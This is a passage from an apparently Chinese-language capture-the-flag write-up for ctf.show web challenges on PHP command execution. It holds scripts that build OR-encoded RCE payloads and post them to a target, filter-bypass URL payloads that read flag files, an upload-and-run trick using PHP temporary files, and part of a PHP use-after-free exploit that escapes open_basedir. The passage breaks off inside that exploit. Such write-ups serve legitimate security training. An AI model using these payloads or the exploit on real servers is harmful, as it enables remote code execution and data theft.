class="line">data1=&quot;(&#x27;&quot;+ans1+&quot;&#x27;|&#x27;&quot;+ans2+&quot;&#x27;)&quot; #data1等于传入的命令,&quot;+ans1+&quot;是固定格式，这样可以得到变量对应的值，再用&#x27;包裹，这样是变量的固定格式，另一个也是如此，两个进行按位与运算，然后得到对应值</span><br><span class="line">ans1=&quot;&quot;#对ans1进行重新赋值</span><br><span class="line">ans2=&quot;&quot;#对ans2进行重新赋值</span><br><span class="line">for k in range(0,len(myb)):#设置k的范围为(0,len(myb))</span><br><span class="line">    myfun(k,myb)#再次引用自定义函数</span><br><span class="line">data2=&quot;(\&quot;&quot;+ans1+&quot;\&quot;|\&quot;&quot;+ans2+&quot;\&quot;)&quot;</span><br><span class="line"> </span><br><span class="line">data=&#123;&quot;c&quot;:data1+data2&#125;</span><br><span class="line">r=requests.post(url=url,data=data)#r等于以post方式传递参数，其中url=上面的url，data等于刚刚得到的data</span><br><span class="line">print(r.text) #输出得到的文本信息</span><br></pre></td></tr></table></figure>



<p>脚本二，官方给的wp</p>
<p>rce_or.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$myfile = fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);</span><br><span class="line">$contents=&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; 256; $i++) &#123; </span><br><span class="line">	for ($j=0; $j &lt;256 ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">		if($i&lt;16)&#123;</span><br><span class="line">			$hex_i=&#x27;0&#x27;.dechex($i);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			$hex_i=dechex($i);</span><br><span class="line">		&#125;</span><br><span class="line">		if($j&lt;16)&#123;</span><br><span class="line">			$hex_j=&#x27;0&#x27;.dechex($j);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			$hex_j=dechex($j);</span><br><span class="line">		&#125;</span><br><span class="line">		$preg = &#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;;</span><br><span class="line">		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">					echo &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		else&#123;</span><br><span class="line">		$a=&#x27;%&#x27;.$hex_i;</span><br><span class="line">		$b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">		$c=(urldecode($a)|urldecode($b));</span><br><span class="line">		if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;</span><br><span class="line">			$contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from sys import *</span><br><span class="line">import os</span><br><span class="line">os.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行</span><br><span class="line">if(len(argv)!=2):</span><br><span class="line">   print(&quot;=&quot;*50)</span><br><span class="line">   print(&#x27;USER：python exp.py &lt;url&gt;&#x27;)</span><br><span class="line">   print(&quot;eg：  python exp.py http://ctf.show/&quot;)</span><br><span class="line">   print(&quot;=&quot;*50)</span><br><span class="line">   exit(0)</span><br><span class="line">url=argv[1]</span><br><span class="line">def action(arg):</span><br><span class="line">   s1=&quot;&quot;</span><br><span class="line">   s2=&quot;&quot;</span><br><span class="line">   for i in arg:</span><br><span class="line">       f=open(&quot;rce_or.txt&quot;,&quot;r&quot;)</span><br><span class="line">       while True:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           if t==&quot;&quot;:</span><br><span class="line">               break</span><br><span class="line">           if t[0]==i:</span><br><span class="line">               #print(i)</span><br><span class="line">               s1+=t[2:5]</span><br><span class="line">               s2+=t[6:9]</span><br><span class="line">               break</span><br><span class="line">       f.close()</span><br><span class="line">   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;</span><br><span class="line">   return(output)</span><br><span class="line">   </span><br><span class="line">while True:</span><br><span class="line">   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))</span><br><span class="line">   data=&#123;</span><br><span class="line">       &#x27;c&#x27;:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   print(&quot;\n[*] result:\n&quot;+r.text)</span><br></pre></td></tr></table></figure>

<p>python exp.py url</p>
<h3 id="web-42"><a href="#web-42" class="headerlink" title="web-42*"></a>web-42*</h3><p>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</p>
<p>这条命令用到了重定向绑定，采作用是错误输出将和标准输出同用一个文件描述符,简单的说就是标准输出和错误输出输出到同一个地方</p>
<p>其简单理解就是把标准输出和错误输出全扔了</p>
<p>直接截断就行：?c&#x3D;cat%20flag.php%0a</p>
<h3 id="web-43"><a href="#web-43" class="headerlink" title="web-43"></a>web-43</h3><p>?c&#x3D;tac%20flag.php%0a</p>
<h3 id="web-44"><a href="#web-44" class="headerlink" title="web-44"></a>web-44</h3><p>?c&#x3D;tac%20fla%27%27g.php%0a</p>
<h3 id="web-45"><a href="#web-45" class="headerlink" title="web-45"></a>web-45</h3><p>?c&#x3D;tac%09fla%27%27g.php%0a</p>
<h3 id="web-46"><a href="#web-46" class="headerlink" title="web-46"></a>web-46</h3><p>&#x2F;?c&#x3D;tac%09fla?.php%0a</p>
<p>&#x2F;?c&#x3D;nl&lt;fla%27%27g.php||</p>
<h3 id="web-47"><a href="#web-47" class="headerlink" title="web-47"></a>web-47</h3><p>&#x2F;?c&#x3D;tac%09fl%27%27ag.php%0a</p>
<h3 id="web-48"><a href="#web-48" class="headerlink" title="web-48"></a>web-48</h3><p>&#x2F;?c&#x3D;tac%09fla%27%27g.php%0a</p>
<h3 id="web-49"><a href="#web-49" class="headerlink" title="web-49"></a>web-49</h3><p>&#x2F;?c&#x3D;tac%09fla?.php%0a</p>
<h3 id="web-50"><a href="#web-50" class="headerlink" title="web-50"></a>web-50</h3><p>&#x2F;?c&#x3D;tac%09fla%27%27g.php%0a</p>
<h3 id="web-51"><a href="#web-51" class="headerlink" title="web-51"></a>web-51</h3><p>&#x2F;?c&#x3D;ta%27%27c&lt;&gt;fla%27%27g.php%0a</p>
<h3 id="web-52"><a href="#web-52" class="headerlink" title="web-52"></a>web-52</h3><p>&#x2F;?c&#x3D;ta%27%27c${IFS}fl%27%27ag.php%0a</p>
<p>没给出flag，看看目录</p>
<p>&#x2F;?c&#x3D;ls${IFS}&#x2F;||</p>
<p>&#x2F;?c&#x3D;cp${IFS}&#x2F;fl%27%27ag${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;a.txt||</p>
<p>&#x2F;a.txt</p>
<h3 id="web-53"><a href="#web-53" class="headerlink" title="web-53"></a>web-53</h3><p>&#x2F;?c&#x3D;nl${IFS}fl%27%27ag.php</p>
<h3 id="web-54"><a href="#web-54" class="headerlink" title="web-54*"></a>web-54*</h3><p>这道题环境有点怪。如果先mv一份，就寄了。所以不要mv！！！</p>
<p>&#x2F;?c&#x3D;rev${IFS}fl?g.php</p>
<p>&#x2F;?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p>
<p>&#x2F;?c&#x3D;xxd${IFS}fla?.php</p>
<p>二进制显示</p>
<h3 id="web-55"><a href="#web-55" class="headerlink" title="web-55*"></a>web-55*</h3><p>什么骚操作</p>
<p>&#x2F;bin&#x2F;base64 flag.php</p>
<p>&#x2F;?c&#x3D;&#x2F;???&#x2F;????64 ????????</p>
<p>无敌的p神。。。。。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<p>本关是属于那种无字母构造webshell的，那么绕过思路呢就是利用linux shell命令，用.可以执行一个文件中的命令，例如.3.php就是执行3.php中的命令<br>此时我们应该去哪里找这个上传的文件呢，扩充一个小的知识点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post上传一个文件后，此时PHP会将我们上传的文件保存在临时文件夹下，</span><br><span class="line">默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机生成的大小写字母。</span><br></pre></td></tr></table></figure>

<p>此时我们肯定想的是构造如下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/?????????</span><br></pre></td></tr></table></figure>

<p>可是符号这种条件的文件有好多个，无法匹配到我们想要的那个文件，这时我们想到glob支持利用[0-9]设置范围，那同理我们也可以设置范围为[A-Z],但是因为字母被过滤掉了，所以我们用A的前一位@和Z的后一位[来进行替代，构造如下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=.%20/???/????????[@-[]</span><br><span class="line">注：%20是空格，也可以用+来代替，目的是进行隔断</span><br></pre></td></tr></table></figure>

<p>此时写一个post包，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://9e1a3122-1876-431c-8e68-91515f1ce03d.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>放到一个html文件中，并打开<br>再构造一个php文件，用于我们访问，内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>此时我们选中php文件，进行抓包，并把payload输入到其中。最后更改php文件中内容，把<code>ls</code>改为<code>cat flag.php</code>，执行结果如下</p>
<h3 id="web-56"><a href="#web-56" class="headerlink" title="web-56"></a>web-56</h3><p>看上面p神的文章，博客里面还有一篇，都要看。</p>
<p>下面给出脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://63212fe8-01b7-4867-ab04-458e8e1a39fb.challenge.ctf.show/?c=. /???/????????[@-[]&quot;</span><br><span class="line">files=&#123;&#x27;file&#x27;:&#x27;ls&#x27;&#125;</span><br><span class="line">for i in range(1000):</span><br><span class="line">	response=requests.post(url,files=files)</span><br><span class="line">	html = response.text</span><br><span class="line">	print(html)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">files=&#123;&#x27;file&#x27;:&#x27;cat flag.php&#x27;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-57"><a href="#web-57" class="headerlink" title="web-57*"></a>web-57*</h3><p>首先需要了解一下取反运算，如果没有对取反没有了解可以自行百度一下，取反有一个公式，无论是正数还是负数都是有效的，<code>~a=-(a+1)</code><br>其次，在linux中，没有字母也可以输出数字，具体如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$(())=0</span><br><span class="line">$((~$(())))=-1</span><br><span class="line">原理是：</span><br><span class="line">$&#123;_&#125;=&quot;&quot;</span><br><span class="line">$(($&#123;_&#125;))=0</span><br><span class="line">$((~$(($&#123;_&#125;))))=-1</span><br><span class="line">然后拼接出-36在进行取反</span><br><span class="line"></span><br><span class="line">注意的是：$&#123;_&#125;会输出上一次的执行结果</span><br></pre></td></tr></table></figure>

<p>&#x2F;?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p>
<h3 id="web-58"><a href="#web-58" class="headerlink" title="web-58*"></a>web-58*</h3><p>c&#x3D;show_source(‘flag.php’);</p>
<h3 id="web-66"><a href="#web-66" class="headerlink" title="web-66"></a>web-66</h3><p>c&#x3D;print_r(scandir(“&#x2F;“));</p>
<p>c&#x3D;highlight_file(“&#x2F;flag.txt”);</p>
<h3 id="web-68"><a href="#web-68" class="headerlink" title="web-68"></a>web-68</h3><p>c&#x3D;var_dump(scandir(‘&#x2F;‘));</p>
<p>c&#x3D;include(‘&#x2F;flag.txt’);</p>
<h3 id="web-70"><a href="#web-70" class="headerlink" title="web-70"></a>web-70</h3><p>c&#x3D;var_export(scandir(‘&#x2F;‘));</p>
<p>c&#x3D;include(‘&#x2F;flag.txt’);</p>
<h3 id="web-71"><a href="#web-71" class="headerlink" title="web-71"></a>web-71</h3><p>ob_get_contents()：返回输出缓冲区的内容，只是得到输出缓冲区的内容，但不清除它。此函数返回输出缓冲区的内容，或者如果输出缓冲区无效将返回FALSE 。</p>
<p>ob_end_clean()：清空（擦除）缓冲区并关闭输出缓冲，此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</p>
<p>c&#x3D;var_export(scandir(‘&#x2F;‘));die();</p>
<p>c&#x3D;include(‘&#x2F;flag.txt’);exit(0);</p>
<h3 id="web-72"><a href="#web-72" class="headerlink" title="web-72*"></a>web-72*</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hookjoy/p/12846164.html">https://www.cnblogs.com/hookjoy/p/12846164.html</a></p>
<p>glob查它目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob://./*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>uaf绕过open_basedir执行命令<br>poc（需要url编码）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function <span class="title function_">ctfshow</span><span class="params">($cmd)</span> &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> &#123;</span></span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!isset($backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> &#123;</span></span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> &#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> &#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= <span class="built_in">sprintf</span>(<span class="string">&quot;%c&quot;</span>,($ptr &amp; <span class="number">0xff</span>));</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> &#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = <span class="built_in">sprintf</span>(<span class="string">&quot;%c&quot;</span>,($v &amp; <span class="number">0xff</span>));</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = <span class="built_in">strlen</span>($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">parse_elf</span><span class="params">($base)</span> &#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">get_basic_funcs</span><span class="params">($base, $elf)</span> &#123;</span><br><span class="line">        <span class="built_in">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span 